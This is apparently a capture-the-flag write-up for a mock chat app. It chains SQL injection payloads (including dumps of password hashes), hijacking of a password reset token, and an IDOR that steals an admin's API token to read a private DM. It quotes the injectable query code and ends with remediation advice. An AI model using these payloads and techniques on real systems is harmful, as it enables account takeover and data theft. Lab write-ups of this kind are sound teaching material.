# IDOR / Token Auth Bypass Writeup

**Category:** IDOR / SQL Injection / API Abuse
**Difficulty:** Medium
**Flag:** `CTF{idor_token_auth_bypass_privesc_complete}`
**Responsible:** Svenja

---

## Overview

This challenge chains three distinct weaknesses into a single attack path:

1. **SQL Injection** in the search endpoint to steal a password reset token from the database.
2. **Logic flaw** in the password reset flow to log in as another user without knowing their password.
3. **IDOR (Insecure Direct Object Reference)** on the REST API to read a different user's private API token, then use it to read a private DM conversation containing the flag.

The flag is hidden in a DM between the system bot (`chatbot`, id=2) and a manager account (`manager_bob`, id=4). `manager_bob`'s DM is inaccessible to a normal account — you have to become him.

---

## The Vulnerability Chain

```
[You] ──SQLi on /search──► read password_resets table
           │
           ▼
      sarah_chen's pre-approved reset token
           │
           ▼
[/reset-password/<token>] ──► session as sarah_chen
           │
           ▼
      IDOR: GET /api/v1/users/4 ──► manager_bob's api_token
           │
           ▼
      X-API-Token: manager_bob_token ──► DM access as manager_bob
           │
           ▼
      CTF{idor_token_auth_bypass_privesc_complete}
```

---

## Background: The Characters

| User | id | Role | Relevance |
|------|-----|------|-----------|
| `demo` | 1 | user | Starting point / your account |
| `chatbot` | 2 | user | Bot that sent the flag in a DM |
| `sarah_chen` | 3 | user | Has an approved reset token; hijackable |
| `manager_bob` | 4 | admin | Has a private DM containing the flag |
| `compliancebot` | 5 | user | XSS bot; irrelevant for this stage |

---

## Step 1 — Log in as Any User

Register a new account at `/register` or log in with the demo account:

```
Username: demo
Password: demo123
```

Once logged in you will see the CorpChat interface — channels in the sidebar, message area, DM button at the top. Take a look around. In `#general` you will see `sarah_chen` mentioning she submitted a password reset and is waiting for the token. This is your hint.

---

## Step 2 — SQL Injection on the Search Endpoint

Navigate to the search bar (top of the page) or visit:

```
http://<ip>:8080/search?q=test
```

The page has a search bar and returns messages and users. What the page doesn't advertise is a third query running in the background: an internal "token lookup" that looks up users by their API token. This query is in `routes/search2.py`:

```python
sql = f"SELECT id, username, api_token FROM users WHERE api_token = '{query}'"
cursor.execute(sql)
token_results = cursor.fetchall()
```

The query result is passed to the template as `token_results`. Normal searches return nothing here (API tokens are UUIDs, not guessable by keyword), but with a UNION injection we can redirect the query to return rows from any other table.

### The Injection

The UNION attack works by appending a second SELECT that returns the same number of columns as the original (`id`, `username`, `api_token`). We want the `password_resets` table, which has columns `id`, `user_id`, `token`.

Navigate to:

```
http://<ip>:8080/search?q=' UNION SELECT id, user_id, token FROM password_resets --
```

URL-encoded version if needed:

```
/search?q=%27+UNION+SELECT+id%2C+user_id%2C+token+FROM+password_resets+--
```

The page will render the token results section. You will see a row where `user_id = 3` (sarah_chen) and the token column shows:

```
a3f8c2e1b4d7f9a0c5e2b8d4f1a6c3e7
```

### Error-Based Discovery

If you haven't found the injection point yet, the application will hint you toward it. Enter a single quote `'` in the search bar:

```
http://<ip>:8080/search?q='
```

The page fires a JavaScript `alert()` popup and renders an inline warning banner:

```
[DEBUG] Internal error in token subsystem:
Query: SELECT id, username, api_token FROM users WHERE api_token = '''
Error: near "'": syntax error
```

This immediately reveals:
1. Your input is injected directly into a SQL string after `api_token = '`
2. The exact query structure and all 3 column names (`id`, `username`, `api_token`)
3. The injection is string-based — close the quote and use UNION to redirect the query

With this information you can construct the UNION payload directly.

### Why More Columns Are Available

You can extend the attack to pull more information:

```
# Dump all tables
' UNION SELECT id, name, 'x' FROM sqlite_master WHERE type='table' --

# Dump all users including password hashes
' UNION SELECT id, username, password_hash FROM users --

# Pull the legacy MD5 hashes (Flag 3 hint)
' UNION SELECT id, username, legacy_password_hash FROM users --
```

---

## Step 3 — Use the Reset Token to Hijack sarah_chen's Account

The `password_resets` table stores tokens with a `status` field. The `approved` status means an admin has reviewed the request and it can be used directly. Visit:

```
http://<ip>:8080/reset-password/a3f8c2e1b4d7f9a0c5e2b8d4f1a6c3e7
```

The application will:
1. Look up the token in `password_resets`.
2. Find it is `approved`.
3. Allow you to set a new password for the associated user (sarah_chen, id=3).
4. Log you in as sarah_chen.

Set any password (e.g., `hacked123`). You now have a valid session as `sarah_chen`.

---

## Step 4 — IDOR to Steal manager_bob's API Token

The REST API endpoint `/api/v1/users/<id>` returns a full user profile. The key problem: it does not check that the requesting user is the same as the requested user. Any authenticated user can fetch any other user's record — including their `api_token`.

`manager_bob` has user id **4**. His token is hardcoded to a fixed UUID in `database.py`:

```python
bob_token = '7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d'
```

Fetch his profile while authenticated as sarah_chen:

```bash
# Get your session cookie from the browser DevTools > Application > Cookies
SESSION="your-session-cookie-value"

curl -s "http://<ip>:8080/api/v1/users/4" \
  -H "Cookie: session=$SESSION" | python3 -m json.tool
```

Response:

```json
{
  "data": {
    "id": 4,
    "username": "manager_bob",
    "display_name": "Bob Manager",
    "bio": "Senior Manager. Admin access for platform oversight.",
    "role": "admin",
    "api_token": "7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d",
    "is_active": 1,
    "last_activity": "..."
  }
}
```

You now have `manager_bob`'s API token.

### How to Find the User ID

If you don't already know bob's id is 4, enumerate it:

```bash
# Try IDs 1 through 10
for i in {1..10}; do
  echo -n "ID $i: "
  curl -s "http://<ip>:8080/api/v1/users/$i" \
    -H "Cookie: session=$SESSION" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('username',''))" 2>/dev/null
done
```

Or use the user list endpoint:

```bash
curl -s "http://<ip>:8080/api/v1/users" \
  -H "Cookie: session=$SESSION" | python3 -m json.tool
```

---

## Step 5 — Authenticate as manager_bob via API Token

The API accepts an `X-API-Token` header. When present, the application looks up the user by token instead of by session. This means you can make authenticated requests as any user whose token you know — without ever knowing their password.

```bash
TOKEN="7f3d9e2a-1b4c-4f8e-a3d7-5c9b0e6f2a1d"

# Verify you're acting as bob
curl -s "http://<ip>:8080/api/v1/users/me" \
  -H "X-API-Token: $TOKEN" | python3 -m json.tool

# List all DM conversations visible to manager_bob
curl -s "http://<ip>:8080/api/v1/dm/conversations" \
  -H "X-API-Token: $TOKEN" | python3 -m json.tool
```

Response shows a conversation with `chatbot`:

```json
{
  "data": [
    {
      "id": 1,
      "other_user": {
        "id": 2,
        "username": "chatbot",
        "display_name": "CorpChat Bot"
      },
      "last_message": "One more thing: the compliance monitoring bot..."
    }
  ]
}
```

---

## Step 6 — Read the DM Containing the Flag

```bash
curl -s "http://<ip>:8080/api/v1/dm/conversations/1/messages" \
  -H "X-API-Token: $TOKEN" | python3 -m json.tool
```

Response:

```json
{
  "data": [
    {
      "id": 1,
      "sender_id": 2,
      "sender_username": "chatbot",
      "content": "Hi Bob, automated security report for Q4. Confidential access key for the audit portal: CTF{idor_token_auth_bypass_privesc_complete}",
      "created_at": "..."
    },
    {
      "id": 2,
      "sender_id": 4,
      "sender_username": "manager_bob",
      "content": "Thanks! I'll review this. Make sure this stays between us - this is sensitive.",
      "created_at": "..."
    },
    {
      "id": 3,
      "sender_id": 2,
      "sender_username": "chatbot",
      "content": "One more thing: the compliance monitoring bot (username: compliancebot) went live this week...",
      "created_at": "..."
    }
  ]
}
```

**Flag: `CTF{idor_token_auth_bypass_privesc_complete}`**

---

## Bonus: Hints in the DM

The third message (from `chatbot`) is the hint for the XSS challenge:

> "...the DM renderer passes message content directly to the browser without sanitization. Could be worth looking at before the audit."

And the bot account `compliancebot` visits every DM conversation every 60 seconds, carrying an encrypted flag cookie. If you send a DM to `compliancebot` containing a JavaScript payload, it will execute in the bot's browser — which is exactly the XSS challenge.

---

## Vulnerability Summary

| Vulnerability | File | Line | Impact |
|---------------|------|------|--------|
| SQL injection | `routes/search2.py` | 64 | Read any SQLite table including `users`, `password_resets`, etc. |
| Insecure reset token | `routes/auth.py` | password reset handler | Bypass authentication for any user with an approved reset |
| IDOR on user endpoint | `routes/api.py` | `/api/v1/users/<id>` | Retrieve any user's API token |
| Missing DM ownership check | `routes/api.py` | DM messages endpoint | Read any conversation by impersonating another user via stolen token |

---

## Alternative Approaches

### Skip sarah_chen: Direct SQLi on password_resets

If you find bob's token via the SQLi directly (not his API token, but checking if any tokens are static):

```sql
' UNION SELECT id, username, api_token FROM users WHERE username='manager_bob' --
```

This dumps `manager_bob`'s token in one step — skipping the reset token path entirely. The longer path via sarah_chen is the "intended" route, but this shortcut works because the IDOR and the SQLi both lead to the same destination.

### Web UI Instead of curl

You can do all of the above through the browser. After obtaining manager_bob's token:
1. Open DevTools → Console.
2. Set the token in a variable: `const token = '7f3d9e2a-...'`
3. Use `fetch('/api/v1/dm/conversations', { headers: {'X-API-Token': token} })` and inspect the response.

---

## Remediation (Real World)

| Vulnerability | Fix |
|---------------|-----|
| SQL injection | Use parameterised queries (`?` placeholders) — never interpolate user input into SQL strings |
| IDOR | Verify that `session['user_id'] == requested_user_id` before returning sensitive fields |
| API token exposure | Exclude `api_token` from user list/profile responses; return it only to the owning user |
| Reset token bypass | Expire reset tokens after use; never allow pre-approved tokens to bypass the admin review step |
